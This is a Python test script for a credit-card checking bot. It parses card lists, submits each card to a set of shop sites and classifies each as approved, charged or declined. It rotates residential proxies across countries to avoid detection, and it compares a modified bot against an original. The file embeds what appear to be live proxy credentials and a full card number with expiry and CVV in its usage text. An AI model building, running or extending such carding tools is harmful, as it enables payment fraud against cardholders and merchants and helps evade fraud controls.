#!/usr/bin/env python3
"""
Non-interactive test script for comparing original vs modified bot.
Usage:
    # Single card test:
    python3 test_noninteractive.py single 5136070130579948|01|27|831

    # Mass check from file:
    python3 test_noninteractive.py mass cc.txt

    # With specific proxy:
    python3 test_noninteractive.py single 5136070130579948|01|27|831 --proxy evo-pro.porterproxies.com:62345:PP_R5CPC6USP1-country-ZW:skn91ad2

    # With proxy list file:
    python3 test_noninteractive.py mass cc.txt --proxyfile proxies.txt
"""

import sys
import os
import time
import argparse
import logging
from typing import Optional, List, Dict, Tuple

logging.basicConfig(
    level=logging.WARNING,  # Suppress info/debug during test
    format='%(asctime)s %(levelname)s %(name)s: %(message)s'
)
logger = logging.getLogger("noninteractive_test")

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

import neww as checkout
from bott import check_single_card, normalize_proxy_url
from bot1 import parse_cards_from_text, progress_block, result_notify_text, classify_prefix


PROXIES = [
    "evo-pro.porterproxies.com:62345:PP_R5CPC6USP1-country-ZW:skn91ad2",
    "evo-pro.porterproxies.com:62345:PP_R5CPC6USP1-country-SR:skn91ad2",
    "evo-pro.porterproxies.com:62345:PP_R5CPC6USP1-country-ML:skn91ad2",
    "evo-pro.porterproxies.com:62345:PP_R5CPC6USP1-country-UA:skn91ad2",
    "evo-pro.porterproxies.com:62345:PP_R5CPC6USP1-country-TJ:skn91ad2",
    "evo-pro.porterproxies.com:62345:PP_R5CPC6USP1-country-PA:skn91ad2",
    "evo-pro.porterproxies.com:62345:PP_R5CPC6USP1-country-VU:skn91ad2",
    "evo-pro.porterproxies.com:62345:PP_R5CPC6USP1-country-AW:skn91ad2",
    "evo-pro.porterproxies.com:62345:PP_R5CPC6USP1-country-MF:skn91ad2",
    "evo-pro.porterproxies.com:62345:PP_R5CPC6USP1-country-FM:skn91ad2",
]


def build_proxy_mapping(proxy_raw: str) -> Dict[str, str]:
    n = normalize_proxy_url(proxy_raw)
    if not n:
        print(f"[WARN] Could not normalize proxy: {proxy_raw}")
        return {}
    return {"http": n, "https": n}


def format_result_line(card_str: str, status: str, code_display: str, amount_display: str,
                        site_label: str, used_proxy: Optional[str], elapsed: float,
                        captcha_value: Optional[str] = None) -> str:
    """Format a single card check result line."""
    status_icon = {
        "approved": "✅",
        "charged": "💎",
        "declined": "❌",
        "captcha": "⚠️",
        "unknown": "❓",
    }.get(status, "❓")

    proxy_short = ""
    if used_proxy:
        try:
            # Show only the country part if evo-pro proxy
            if "country-" in used_proxy:
                proxy_short = "[" + used_proxy.split("country-")[1].split(":")[0] + "]"
            else:
                proxy_short = f"[proxy]"
        except Exception:
            proxy_short = "[proxy]"

    captcha_note = ""
    if captcha_value and captcha_value not in ("None", "", "0"):
        captcha_note = f" | captcha={captcha_value}"

    return (
        f"{status_icon} {status.upper():8s} | {card_str:40s} | "
        f"{(code_display or '').strip()[:60]:60s} | "
        f"{amount_display or '$0':6s} | {site_label or '':30s} | "
        f"{proxy_short:6s} | {elapsed:.2f}s{captcha_note}"
    )


def run_single_card_test(card_str: str, proxy_raw: Optional[str] = None,
                          sites: Optional[List[str]] = None, bot_label: str = "BOT") -> dict:
    """Run a single card test and return result dict."""
    card = checkout.parse_cc_line(card_str)
    if not card:
        print(f"[ERROR] Could not parse card: {card_str}")
        return {}

    if sites is None:
        sites = checkout.read_sites_from_file("working_sites.txt")
        if not sites:
            sites = checkout.read_sites_from_file("working_sites1.txt")
    print(f"[{bot_label}] Sites loaded: {len(sites)}")

    proxy_mapping = None
    if proxy_raw:
        proxy_mapping = build_proxy_mapping(proxy_raw)
        print(f"[{bot_label}] Proxy: {normalize_proxy_url(proxy_raw)}")
    else:
        # Use first default proxy
        proxy_mapping = build_proxy_mapping(PROXIES[0])
        print(f"[{bot_label}] Proxy (default): {normalize_proxy_url(PROXIES[0])}")

    t0 = time.time()
    result = check_single_card(card, sites, proxy_mapping)
    elapsed = time.time() - t0

    status, code_display, amount_display, site_label, used_proxy, shop_url, receipt_id = result

    print(format_result_line(card_str, status, code_display, amount_display, site_label, used_proxy, elapsed))
    print(f"    Receipt: {receipt_id}  |  Shop: {shop_url}")
    print()

    return {
        "card": card_str,
        "status": status,
        "code": code_display,
        "amount": amount_display,
        "site": site_label,
        "proxy": used_proxy,
        "elapsed": elapsed,
        "receipt": receipt_id,
    }


def run_mass_check(cards_file: str, proxy_raw_list: Optional[List[str]] = None,
                    max_cards: int = 0, bot_label: str = "BOT") -> None:
    """Run a mass check from a file."""
    if not os.path.exists(cards_file):
        print(f"[ERROR] Cards file not found: {cards_file}")
        return

    with open(cards_file, "r", encoding="utf-8", errors="ignore") as f:
        text = f.read()

    cards = parse_cards_from_text(text)
    if not cards:
        print(f"[ERROR] No cards found in {cards_file}")
        return

    if max_cards > 0:
        cards = cards[:max_cards]

    sites = checkout.read_sites_from_file("working_sites.txt")
    if not sites:
        sites = checkout.read_sites_from_file("working_sites1.txt")
    print(f"[{bot_label}] Sites: {len(sites)} | Cards to check: {len(cards)}")

    # Build proxy rotation list
    proxies_normalized = []
    if proxy_raw_list:
        for pr in proxy_raw_list:
            n = normalize_proxy_url(pr)
            if n:
                proxies_normalized.append(n)
    else:
        for pr in PROXIES:
            n = normalize_proxy_url(pr)
            if n:
                proxies_normalized.append(n)

    if not proxies_normalized:
        print("[WARN] No valid proxies, running without proxy")

    print(f"[{bot_label}] Proxies: {len(proxies_normalized)}")
    print(f"\n{'='*120}")
    print(f"{'STATUS':8s} | {'CARD':40s} | {'CODE':60s} | {'AMT':6s} | {'SITE':30s} | {'PX':6s} | TIME")
    print(f"{'='*120}")

    total = len(cards)
    approved = 0
    declined = 0
    charged = 0
    captcha = 0
    start_ts = time.time()
    proxy_idx = 0

    for i, card in enumerate(cards):
        card_str = f"{card['number']}|{card['month']}|{card['year']}|{card['verification_value']}"

        # Rotate proxies
        proxy_mapping = None
        if proxies_normalized:
            proxy_url = proxies_normalized[proxy_idx % len(proxies_normalized)]
            proxy_mapping = {"http": proxy_url, "https": proxy_url}
            proxy_idx += 1

        t0 = time.time()
        try:
            result = check_single_card(card, sites, proxy_mapping)
            elapsed = time.time() - t0
            status, code_display, amount_display, site_label, used_proxy, shop_url, receipt_id = result
        except Exception as e:
            elapsed = time.time() - t0
            status = "unknown"
            code_display = str(e)[:60]
            amount_display = "$0"
            site_label = ""
            used_proxy = None

        if status == "approved":
            approved += 1
        elif status == "charged":
            charged += 1
        elif status == "declined":
            declined += 1
        elif status == "captcha":
            captcha += 1

        print(format_result_line(card_str, status, code_display, amount_display, site_label, used_proxy, elapsed))

        # Show progress every 10 cards
        if (i + 1) % 10 == 0:
            print()
            print(progress_block(total, i + 1, approved, declined, charged, start_ts, captcha))
            print()

    elapsed_total = int(time.time() - start_ts)
    print(f"\n{'='*120}")
    print(f"🏁 Check Complete")
    print(f"\nTotal: {total}")
    print(f"✅ Approved: {approved}")
    print(f"❌ Declined: {declined}")
    print(f"💎 Charged: {charged}")
    print(f"⚠️ CAPTCHA: {captcha}")
    print(f"⏱ Time: {elapsed_total}s")


def run_original_bot_single(card_str: str, proxy_raw: Optional[str] = None) -> dict:
    """Run single card test using original bot's check_single_card."""
    # Import from original bot directory
    orig_dir = os.path.join(os.path.dirname(os.path.abspath(__file__)), "original_bot")
    sys.path.insert(0, orig_dir)
    try:
        import importlib
        import neww as orig_checkout
        orig_bott = importlib.import_module("bott")
        orig_check = orig_bott.check_single_card

        card = orig_checkout.parse_cc_line(card_str)
        if not card:
            print(f"[ORIG] Could not parse card: {card_str}")
            return {}

        sites = orig_checkout.read_sites_from_file(
            os.path.join(os.path.dirname(os.path.abspath(__file__)), "working_sites.txt")
        )
        print(f"[ORIG] Sites loaded: {len(sites)}")

        proxy_mapping = None
        if proxy_raw:
            from bott import normalize_proxy_url as norm_url
            n = norm_url(proxy_raw)
            proxy_mapping = {"http": n, "https": n}

        t0 = time.time()
        result = orig_check(card, sites, proxy_mapping)
        elapsed = time.time() - t0

        status, code_display, amount_display, site_label, used_proxy, shop_url, receipt_id = result
        print(format_result_line(card_str, status, code_display, amount_display, site_label, used_proxy, elapsed))
        return {"status": status, "code": code_display, "elapsed": elapsed}
    finally:
        sys.path.pop(0)


def main():
    parser = argparse.ArgumentParser(description="Non-interactive bot card checker test")
    parser.add_argument("mode", choices=["single", "mass", "compare"],
                        help="Test mode: single card, mass check, or compare original vs modified")
    parser.add_argument("target", help="Card string (for single/compare) or file path (for mass)")
    parser.add_argument("--proxy", help="Single proxy in host:port:user:pass or http://user:pass@host:port format")
    parser.add_argument("--proxyfile", help="File with one proxy per line")
    parser.add_argument("--max", type=int, default=0, help="Max cards for mass check (0=all)")

    args = parser.parse_args()

    # Load proxy list
    proxy_list = None
    if args.proxyfile and os.path.exists(args.proxyfile):
        with open(args.proxyfile, "r") as f:
            proxy_list = [ln.strip() for ln in f if ln.strip()]
    elif args.proxy:
        proxy_list = [args.proxy]

    if args.mode == "single":
        print(f"\n{'='*80}")
        print(f"SINGLE CARD TEST - MODIFIED BOT")
        print(f"Card: {args.target}")
        print(f"{'='*80}\n")
        run_single_card_test(
            args.target,
            proxy_raw=proxy_list[0] if proxy_list else None,
            bot_label="MODIFIED"
        )

    elif args.mode == "compare":
        print(f"\n{'='*80}")
        print(f"COMPARE TEST - MODIFIED vs ORIGINAL")
        print(f"Card: {args.target}")
        print(f"{'='*80}\n")

        print(">>> MODIFIED BOT:")
        res_modified = run_single_card_test(
            args.target,
            proxy_raw=proxy_list[0] if proxy_list else None,
            bot_label="MODIFIED"
        )

        print(">>> ORIGINAL BOT:")
        res_original = run_original_bot_single(
            args.target,
            proxy_raw=proxy_list[0] if proxy_list else None
        )

        print(f"\n{'='*80}")
        print("COMPARISON SUMMARY:")
        print(f"  Modified: {res_modified.get('status')} | {res_modified.get('code', '')[:60]}")
        print(f"  Original: {res_original.get('status')} | {res_original.get('code', '')[:60]}")
        if res_modified.get('status') == res_original.get('status'):
            print("  ✅ Results match!")
        else:
            print("  ⚠️ Results differ!")

    elif args.mode == "mass":
        print(f"\n{'='*80}")
        print(f"MASS CHECK TEST - MODIFIED BOT")
        print(f"File: {args.target}")
        print(f"{'='*80}\n")
        run_mass_check(
            args.target,
            proxy_raw_list=proxy_list,
            max_cards=args.max,
            bot_label="MODIFIED"
        )


if __name__ == "__main__":
    main()
